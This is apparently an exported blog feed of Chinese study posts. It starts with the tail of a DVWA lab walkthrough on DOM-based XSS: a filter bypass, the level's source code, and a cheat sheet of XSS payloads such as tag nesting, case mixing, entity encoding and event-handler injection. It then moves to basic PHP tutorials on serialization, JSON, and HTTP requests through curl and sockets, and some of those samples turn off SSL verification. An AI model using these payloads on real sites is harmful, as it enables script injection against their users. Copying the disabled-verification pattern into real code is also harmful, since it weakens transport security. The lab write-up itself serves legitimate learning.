<li>Select English，发现是通过url提交</li>
<li>在default之后插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看页面元素进行审查，发现无过滤和转义</li>
<li>在default之后插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>会弹出default=English</li>
</ul>
<p><img src="/images/xss/dvwa/DOM--XSS-High--%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="DOM--XSS-High--过滤"></p>
<ul>
<li>绕过方法<ul>
<li><code>#&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>任何一个字符加#就可以任何绕过，此思路有点神奇</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

// Is there any input?
if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {

    # White list the allowable languages
    switch ($_GET[&#39;default&#39;]) {
        case &quot;French&quot;:
        case &quot;English&quot;:
        case &quot;German&quot;:
        case &quot;Spanish&quot;:
            # ok
            break;
        default:
            header (&quot;location: ?default=English&quot;);
            exit;
    }
}

?&gt;</code></pre><h4 id="10-关于DVWA靶场"><a href="#10-关于DVWA靶场" class="headerlink" title="10. 关于DVWA靶场"></a>10. 关于DVWA靶场</h4><ul>
<li>▲ 靶场的绕过方法多种，文中所给为其中一种，但不外乎为以下例子</li>
<li>DVWA靶场还是相对容易的，跟封神台相比，差好多级别</li>
<li>Impossible级别的目前还没人能够成功注入</li>
<li>靶场常用语句<ul>
<li>特殊字符：<code>&#39;&quot;&lt;&gt;666</code></li>
<li>弹窗：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>大小写：<code>&lt;sCrIpt&gt;alert(1)&lt;/ScrIpt&gt;</code></li>
<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
<li>重复script：<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
<li>HTML实体编码：<code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;</code></li>
<li>onclick事件：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
<li>onload事件：<code>&lt;img src=x onload=alert(1)&gt;</code></li>
<li>onerror事件：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>href属性：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>src属性：<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>⭐ 闭合标签+注释\</li>
<li>▲ 更多的，在XSS讲解中，一般无外乎上面常用的语句与闭合标签的结合</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-7：php将数组写入文件的方法</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-7%EF%BC%9Aphp%E5%B0%86%E6%95%B0%E7%BB%84%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>serialize()函数</p>
<ul>
<li>使用 serialize 将数组序列化，存储在文件中；调用时，再使用 unserialize 还原</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

    $file = &#39;./1.txt&#39;;
    $array=array(&#39;color&#39;=&gt; array(&#39;blue&#39;,&#39;red&#39;,&#39;green&#39;),&#39;size&#39;=&gt; array(&#39;small&#39;,&#39;medium&#39;,&#39;large&#39;)); 

    //缓存
    if(false!==fopen($file, &quot;w+&quot;)){
        file_put_contents($file, serialize($array));
    }
    //读出缓存

    $handle = fopen($file,&quot;r+&quot;);
    $cacheArray = unserialize(fread($handle, filesize($file)));
    var_dump($cacheArray);

?&gt;</code></pre><ol start="2">
<li><p>print_r()函数</p>
<ul>
<li>print_r()将数组打印到txt文件中<ul>
<li>▲ 第二个参数为TRUE，print_r()会直接返回信息，而不是输出</li>
<li>▲ 如果输入的内容是 string、 integer 或 float，会直接输出值本身。 如果输入的内容是 array，展示的格式会显示数组的键和包含的元素。object 也类似。</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php


    $array=array(&#39;color&#39;=&gt; array(&#39;blue&#39;,&#39;red&#39;,&#39;green&#39;),&#39;size&#39;=&gt; array(&#39;small&#39;,&#39;medium&#39;,&#39;large&#39;)); 

    file_put_contents(&#39;./1.txt&#39;, print_r($array,true));


?&gt;</code></pre><ol start="3">
<li><p>var_export()函数</p>
<ul>
<li>var_export()直接将数组以完整数组的形式存储到文件中</li>
<li>▲ 输出或返回一个变量的字符串表示，返回的是一个合法的PHP代码，这点与var_dump()不同</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

    $file = &#39;./1.txt&#39;;
    $array=array(&#39;color&#39;=&gt; array(&#39;blue&#39;,&#39;red&#39;,&#39;green&#39;),&#39;size&#39;=&gt; array(&#39;small&#39;,&#39;medium&#39;,&#39;large&#39;)); 

    //缓存
    $text = var_export($array,true);
    if(false!==fopen($file,&#39;w+&#39;)){
        file_put_contents($file, $text);
    }else{
        echo &quot;创建失败&quot;;
    }

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-6：json在PHP中的应用</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-6%EF%BC%9Ajson%E5%9C%A8PHP%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>json_encode()</p>
<ul>
<li>来将数组和对象，转换为json格式</li>
<li>▲ json只接受utf-8编码的字符，所以json_encode()的参数必须是utf-8编码，否则会得到空字符或者null</li>
<li>数组格式<ul>
<li>索引数组 -&gt; 数组格式</li>
<li>关联数组 -&gt; 对象格式</li>
<li>类 -&gt; 对象格式<ul>
<li>除了公开变量，其他东西（）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

   //索引数组格式转换为json格式

   $arr = array(&#39;one&#39;,&#39;two&#39;,&#39;three&#39;);
   echo json_encode($arr);  //输出为 [&quot;one&quot;,&quot;two&quot;,&quot;three&quot;]
   echo &quot;&lt;/br&gt;&quot;;


   //关联数组格式转换为json格式

   $arr1 = array(&#39;hi&#39; =&gt; &#39;one&#39;, &#39;how&#39; =&gt; &#39;are&#39;, &#39;are&#39; =&gt; &#39;you&#39; );
   echo json_encode($arr1);  //输出为 {&quot;hi&quot;:&quot;one&quot;,&quot;how&quot;:&quot;are&quot;,&quot;are&quot;:&quot;you&quot;}
   echo &quot;&lt;/br&gt;&quot;;

   //类转换为json格式

   class Foo{
    const ERROR_CODE = &#39;404&#39;;
    public $publice_ex = &#39;this is publice&#39;;
    private $private_ex = &#39;this is private&#39;;
    protected $protected_ex = &#39;this should be protected&#39;;
    public function getErrorCode(){
        return self::ERROR_CODE;
    }
   }

   $foo = new Foo();
   $foo_json = json_encode($foo);
   echo $foo_json;  //输出为 {&quot;publice_ex&quot;:&quot;this is publice&quot;}

?&gt;</code></pre><ol start="2">
<li><p>json_decode()函数</p>
<ul>
<li>将json文本转换为相应的PHP数据结构</li>
<li>▲ 通常情况下，json_decode()总是返回一个PHP对象，而不是数组</li>
<li>▲ json只能用来表示对象（object）和数组（array），如果对一个字符串或数值使用json_decode()，将会返回null</li>
<li>常见注意事项：<ul>
<li>json的分隔符（delimiter）只允许使用双引号，不能使用单引号</li>
<li>json名值对的”名”（冒号左边的部分），任何情况下都必须使用双引号</li>
<li>最后一个值之后不能添加逗号</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

    $json = &#39;{&quot;foo&quot;:123,&quot;fll&quot;:456}&#39;;
    $obj = json_decode($json);
    var_dump($obj);  //输出为 object(stdClass)#1 (2) { [&quot;foo&quot;]=&gt; int(123) [&quot;fll&quot;]=&gt; int(456) } 
    echo &quot;&lt;/br&gt;&quot;;

    //强制转化为关联数组

    $obj1 = json_decode($json,true);
    var_dump($obj1);  //输出为 array(2) { [&quot;foo&quot;]=&gt; int(123) [&quot;fll&quot;]=&gt; int(456) } 

?&gt;</code></pre><ol start="3">
<li>php从数据库读取数据,并以json格式返回数据的方法</li>
</ol>
<pre><code>&lt;?php

    $data = array();
    $json = &#39;&#39;;
    class user{
        public $id;
        public $fname;
        public $lname;
        public $email;
        public $password;
    }

    $conn = mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;,&#39;php_mysql_demo&#39;);

    $sql = &quot;select * from json&quot;;
    $result = $conn-&gt;query($sql);

    if($result){
        while($row = mysqli_fetch_array($result,MYSQLI_ASSOC))
        {
            $user = new user();
            $user-&gt;id = $row[&#39;id&#39;];
            $user-&gt;fname = $row[&#39;fname&#39;];
            $user-&gt;lname = $row[&#39;lname&#39;];
            $user-&gt;email = $row[&#39;email&#39;];
            $user-&gt;password = $row[&#39;password&#39;];
            $data[] = $user;
        }
        $json = json_encode($data);
        echo $json;  //输出为 [{&quot;id&quot;:&quot;7&quot;,&quot;fname&quot;:&quot;tomas&quot;,&quot;lname&quot;:&quot;sky&quot;,&quot;email&quot;:&quot;643008933@qq.com&quot;,&quot;password&quot;:&quot;mzt&quot;}]
    }else{
        echo &quot;查询失败&quot;;
    }
?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-5：fsockopeb模拟GET-POST请求</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-5%EF%BC%9Afsockopeb%E6%A8%A1%E6%8B%9FGET-POST%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>fsockopen()函数</p>
<ul>
<li>打开一个网络连接或者一个Unix套接字连接</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
<li>▲ 2020.03.16 能定制任意的连接，但作为网络抓取的成果是不理想的。若要做网络抓取，需要写完整的http请求并定制回送的http请求</li>
<li>▲ 2020.03.16 存在waf，很难发送正常的数据</li>
</ul>
</li>
<li><p>parse_url()函数</p>
<ul>
<li>解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a></li>
<li>▲ 2020.03.16 此函数对其他url中未有的参数不会进行默认设置</li>
</ul>
</li>
<li><p>模拟GET请求</p>
</li>
</ol>
<pre><code>&lt;?php

    $url = array(&#39;host&#39; =&gt; &#39;www.wyu.cn&#39;, &#39;port&#39; =&gt; &#39;80&#39;,&#39;path&#39; =&gt; &#39;&#39;,&#39;query&#39;=&gt; &#39;/&#39; ,&#39;cookie&#39; =&gt; &#39;/&#39;);  //请求的url数组
    $fp = fsockopen($url[&#39;host&#39;],$url[&#39;port&#39;],$errno,$errstr,10);  //打开一个sock连接
    $fp = fsockopen(&quot;ssl://&quot;.$url[&#39;host&#39;],$url[&#39;port&#39;],$errno,$errstr,10);
    //对https连接的支持

    if(!$fp)
    {
        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错
    }else
    {
        $out = &quot;GET /$url[path] HTTP/1.1\r\n&quot;;
        $out.= &quot;Host: 61.160.224.50:80\r\n&quot;;
        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;
        $out.= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;
        fwrite($fp,$out);  //将http的头写入文件指针
        while(!feof($fp))  //feof()判断文件指针是否到文件底部
        {
            echo fgets($fp,1024);  //取出拿到的数据放在字符串中
        }
        fclose($fp);  //关闭文件指针
    }


?&gt;</code></pre><ol start="3">
<li>模拟POST请求</li>
</ol>
<pre><code>&lt;?php

    $url = &#39;http://www.wyu.cn&#39;;  //要抓取的url
    $url_info = parse_url($url);  //对url进行字段解析

    $fp = fsockopen($url_info[&#39;host&#39;],80,$errno,$errstr,10);  ////打开一个sock连接

    $data = array(
        &#39;name&#39; =&gt; &#39;mzt&#39;,
        &#39;number&#39; =&gt; &#39;7&#39;
    );  //要发送的post数据

    $post_data = http_build_query($data);  //url-encode编码要post的数据

    if(!$fp)
    {
        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错
    }else
    {
        $out = &quot;POST &quot;.$url_info[&#39;path&#39;].&quot; HTTP/1.1\r\n&quot;;
        $out.= &quot;Host: &quot;.$url_info[&#39;host&#39;].&quot;\r\n&quot;;
        $out.= &quot;Content-type: application/x-www-form-urlencodedn&quot;;
        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;
        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;
        $out.= &quot;$post_data\r\n&quot;;
        fwrite($fp,$out);  //将http的头写入文件指针
        while(!feof($fp))  //feof()判断文件指针是否到文件底部
        {
            echo fgets($fp,1024);  //取出拿到的数据放在字符串中
        }
        fclose($fp);  //关闭文件指针
    }


?&gt;
</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-4：fopen模拟GET请求</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-4%EF%BC%9Afopen%E6%A8%A1%E6%8B%9FGET%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>stream_get_meta_data()函数</p>
<ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-get-meta-data" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-get-meta-data</a></li>
<li>从封装协议文件指针中取得报头／元数据</li>
<li>▲ 需是从 fopen()，fsockopen() 和 pfsockopen() 建立的流，返回的是一个数组</li>
</ul>
</li>
<li><p>模拟GET请求</p>
</li>
</ol>
<pre><code>&lt;?php

    $url = &#39;http://www.wyu.cn/&#39;;  //要抓取的url
    $fp = fopen($url, &#39;r&#39;);  //以fopen的形式打开url
    stream_get_meta_data($fp);  //转换数据为流
    $result = &#39;&#39;;
    while(!feof($fp))  //feof()判断文件指针是否到文件底部
    {
        $result .= fgets($fp, 1024);  //取出拿到的数据放在字符串中
    }
    echo $result;  //输出
    fclose($fp);  //关闭文件指针

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-3：curl模拟GET-POST请求</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-3%EF%BC%9Acurl%E6%A8%A1%E6%8B%9FGET-POST%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>curl</p>
<ul>
<li>▲ 网上吹嘘curl库的强大，今天用来入门模拟一下GET和POST请求</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/ref.curl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.curl.php</a></li>
<li>curl功能库简介：<a href="https://www.jb51.net/article/26751.htm" target="_blank" rel="noopener">https://www.jb51.net/article/26751.htm</a></li>
<li>curl基础流程<ul>
<li>curl_init()</li>
<li>curl_setopt()</li>
<li>curl_exec()</li>
<li>curl_close()</li>
</ul>
</li>
<li>▲ 支持多种代理模式（HTTP/FTP/SOCKS4/SOCKS5）</li>
</ul>
</li>
<li><p>file_put_contents()函数</p>
<ul>
<li>要写入的数据。类型可以是 string，array 或者是 stream 资源</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-put-contents.php</a></li>
<li>▲ 可结合curl，将流数据，数组或者字符串写入文件</li>
</ul>
</li>
<li><p>curl模拟GET请求</p>
</li>
</ol>
<pre><code>&lt;?php

    header(&#39;Content-type:text/html;charset=utf-8&#39;);
    $header = array();  //头部数组
    $header[] = &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;;
    $header[] = &#39;Cache-Control: no-cache&#39;;
    $header[] = &#39;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&#39;;
    $url = &#39;https://www.douban.com&#39;;  //要抓取的url
    $ch = curl_init();  //curl初始化
    $timeout = 15;  //超时时间
    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头
    curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式
    curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器
    $file_contents = curl_exec($ch);  //发送curl请求
    curl_close($ch);  //关闭curl请求
    //$file_contents = json_decode($file_contents);  //若接收数据为json数据，解码
    mb_convert_encoding($file_contents,&#39;utf-8&#39;);  //转换字符编码
    $f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可写可读
    Fwrite($f,$file_contents);  //写入文件
    Fclose($f);  //关闭文件
    print_r($file_contents);  //输出抓取的信息到屏幕上

?&gt;</code></pre><ol start="4">
<li><p>curl模拟POST请求</p>
<ul>
<li>test.php</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

    var_dump($_POST);

?&gt;</code></pre><pre><code>&lt;?php

    $post_data = array(
        &#39;name&#39; =&gt; &#39;mzt&#39;,
        &#39;age&#39; =&gt; &#39;21&#39; );  //post数据
    $post_data = http_build_query($post_data);  //url-encode编码数据
    $post_data = json_encode($post_data);  //json编码数据
    $url = &#39;http://localhost/test.php&#39;;  //要抓取的url
    $ch = curl_init();  //curl初始化
    $timeout = 5;  //超时时间
    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间
    curl_setopt($ch, CURLOPT_POST, 1);  //设置发送的方式为post
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  //设置post的数据
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&#39;Content-Type:application/json&#39;));  //json编码设置
    $file_contents = curl_exec($ch);  //发送curl请求
    curl_close($ch);  //关闭curl请求
    mb_convert_encoding($file_contents,&#39;utf-8&#39;);  //转换字符
    print_r($file_contents);  //输出抓取的信息到屏幕

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-2：file_get_contents模拟GET-POST请求</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-2%EF%BC%9Afile_get_contents%E6%A8%A1%E6%8B%9FGET-POST%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>stream_context_create()函数</p>
<ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-context-create.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-context-create.php</a></li>
<li>创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程</li>
</ul>
</li>
<li><p>http_build_query()函数</p>
<ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.http-build-query" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.http-build-query</a></li>
<li>将数组转换 url-encoded 之后的请求字符串</li>
<li>▲ 博客介绍使用：<a href="https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html</a></li>
</ul>
</li>
<li><p>file_get_contents()函数</p>
<ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-get-contents" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-get-contents</a></li>
<li>将整个文件读入一个字符串</li>
<li>▲ 2020.03.15 只支持HTTP代理 </li>
<li>▲ 2020.03.15 对https的链接抓取会报错</li>
</ul>
</li>
<li><p>模拟GET请求</p>
</li>
</ol>
<pre><code>&lt;?php

    $url = &#39;http://www.wyu.cn/&#39;;  //要抓取的url
    $html = file_get_contents($url);  //抓取url
    print_r($html);

?&gt;</code></pre><ol start="5">
<li>模拟POST请求</li>
</ol>
<pre><code>&lt;?php

    $data = array(
        &#39;name&#39; =&gt; &#39;mzt&#39;,
        &#39;number&#39; =&gt; &#39;7&#39;
    );  //要发送的post数据
    $url = &#39;http://www.wyu.cn/&#39;;  //要抓取的url

    $post_data = http_build_query($data);  //url-encode编码要post的数据

    $options = array(
        &#39;http&#39; =&gt; array(
            &#39;method&#39; =&gt; &#39;POST&#39;,  //POST请求的方法
            &#39;request_fulluri&#39;=&gt; true,
            &#39;header&#39; =&gt; array(&quot;Accept-language: en&quot;,
                &quot;Content-type: application/x-www-form-urlencoded&quot;,
                &quot;user_agent: Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&quot;,
                &quot;cookie: aaa=aaa&quot;),  //POST请求的头部，Content-type固定，其他可改
            //&#39;proxy&#39; =&gt; &#39;tcp://127.0.0.1:22716&#39;,  //只支持HTTP代理
            &#39;content&#39; =&gt; $post_data,  //POST的主体，也即POST的数据
            &#39;timeout&#39; =&gt; 5)  //超时时间
    );

    $options = stream_context_create($options);  //对要传输的数据进行流式处理
    $html = file_get_contents($url,false,$options);  //POST情况下第三个参数要设置
    echo $html;

?&gt;</code></pre><ul>
<li>测试数据是否POST成功<ul>
<li>test.php</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    $data = $_POST;
    echo &#39;&lt;pre&gt;&#39;;
    print_r( $data );
    echo &#39;&lt;/pre&gt;&#39;;

?&gt;</code></pre><ul>
<li>修改url为test.php的路径</li>
<li>查看是否有输出结果</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习-1：redis扩展、curl扩展和openssl扩展</title>
    <url>/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-1%EF%BC%9Aredis%E6%89%A9%E5%B1%95%E3%80%81curl%E6%89%A9%E5%B1%95%E5%92%8Copenssl%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>phpspider</p>
<ul>
<li>在学习PHP爬虫的过程中，在Github上找到一个几年前的项目，叫phpspider，因为社会实践的需要，开始下载使用</li>
<li>Github地址：<a href="https://github.com/owner888/phpspider" target="_blank" rel="noopener">https://github.com/owner888/phpspider</a></li>
<li>开发文档：<a href="https://doc.phpspider.org/" target="_blank" rel="noopener">https://doc.phpspider.org/</a></li>
<li>▲ 2020.03.15 该框架需要安装Redis，开启Redis扩展</li>
<li>▲ 2020.03.15 该框架需要开启curl扩展</li>
<li>▲ 2020.03.15 该框架面板模式不支持在Window下</li>
<li>▲ 2020.03.15 该框架在Window 10下无法自定义多线程</li>
</ul>
</li>
<li><p>Redis以及扩展</p>
<ul>
<li>▲ 2020.03.15 Redis for Window官方已经停止维护</li>
<li>▲ Redis默认端口为6379，默认密码为空密码</li>
<li>Redis废弃函数替换：<a href="https://blog.csdn.net/xchenhao/article/details/97251618" target="_blank" rel="noopener">https://blog.csdn.net/xchenhao/article/details/97251618</a></li>
<li>Redis -&gt; Github的维护仓库：<a href="https://github.com/antirez/redis/releases" target="_blank" rel="noopener">https://github.com/antirez/redis/releases</a></li>
<li>Redis扩展 -&gt; pecl的维护仓库：<a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></li>
<li>下载Redis.msi安装文件，下载Redis扩展（对应PHP版本）</li>
<li>拷贝redis的扩展php_redis.dll -&gt; php/ext</li>
<li>php开启扩展（php.ini文件）<ul>
<li>extension=php_redis.dll</li>
</ul>
</li>
<li>重启Apache，查看phpinfo，是否有Redis</li>
<li>php_redis_test.php</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

     $redis = new Redis();                   //redis对象
     $redis-&gt;connect(&quot;127.0.0.1&quot;,&quot;6379&quot;); //连接redis服务器
     $redis-&gt;set(&quot;test&quot;,&quot;Hello World&quot;);      //set字符串值
     echo $redis-&gt;get(&quot;test&quot;);               //获取值

?&gt;</code></pre><p><img src="/images/php/php-learing/Redis%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="Redis安装成功"></p>
<ol start="3">
<li><p>CURL扩展</p>
<ul>
<li>▲ 2020.03.15 网上看到了很多关于Window环境开启curl的方法，但都存在一定问题</li>
<li>php开启扩展（php.ini）<ul>
<li>extension=curl</li>
</ul>
</li>
<li>▲ curl加载：找到对应php目录下libssh2.dll文件，复制到对应apache的bin文件夹下</li>
<li>重启Apache，查看phpinfo，是否有Redis</li>
<li>php_curl_test.php</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

     var_dump(curl_init());  //输出为 resource(2) of type (curl) 

?&gt;</code></pre><p><img src="/images/php/php-learing/CURL%E6%89%A9%E5%B1%95%E5%8A%A0%E8%BD%BD%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="CURL扩展加载成功"></p>
<ol start="4">
<li><p>openssl扩展</p>
<ul>
<li>▲ 对于现在大多数网站来说，都是https模式，爬虫需要开启openssl扩展建立连接</li>
<li>php开启扩展（php.ini文件）<ul>
<li>extension=php_openssl</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><img src="/images/php/php-learing/openssl%E6%89%A9%E5%B1%95%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="openssl扩展成功"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP实战-1：2019年新冠状病毒数据的抓取Demo</title>
    <url>/2020/03/16/PHP%E5%AE%9E%E6%88%98-1%EF%BC%9A2019%E5%B9%B4%E6%96%B0%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8A%93%E5%8F%96Demo/</url>
    <content><![CDATA[<hr>
<ol>
<li><p>代码介绍</p>
<ul>
<li>▲ 本代码是通过GET请求，抓取丁香园疫情数据，对丁香园疫情数据的分析，进行正则匹配筛选，最后封装成json文件</li>
<li>▲ 2020.03.16 本代码目前只能对中国地区的数据抓取，其他地区的数据类同，待修改</li>
<li>▲ 2020.03.16 本代码中间对字符串的处理不具有通用性，待修改</li>
<li>▲ 2020.03.16 本代码未实现写入数据库的功能，但不难，待修改</li>
<li>包含的内容<ul>
<li>php的curl库的数据抓取</li>
<li>正则表达式的简单使用</li>
<li>字符串的多重处理</li>
<li>json数据的形式</li>
</ul>
</li>
<li>过程中踩的坑<ul>
<li>curl抓取页面，因为是<code>&lt;scipt&gt;</code>标签内的形式，所以html页面只显示404，需要通过查看页面源代码的方式去查询到数据</li>
<li>正则表达式的写法，中文字符目前还无法匹配</li>
<li>字符串与数组的互相转换</li>
<li>“”在写出json文件时，会出现转义字符/</li>
<li>将数组写进文件，不能通过fwrite()函数的形式，需要通过file_put_contents()函数</li>
<li>json_encode有多种表示参数，在第二个参数options中可进行设置</li>
<li>var_dump()函数是个好东西，可以通过这个进行输出</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

    header(&#39;Content-type:text/html;charset=utf-8&#39;);  //文件编码形式
    $header = array();  //头部形式
    $header[] = &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;;
    $header[] = &#39;Cache-Control: no-cache&#39;;
    $header[] = &#39;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&#39;;
    $url = &#39;https://ncov.dxy.cn/ncovh5/view/pneumonia&#39;;  //要抓取的url
    $ch = curl_init();  //curl初始化
    $timeout = 5;  //超时时间
    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证
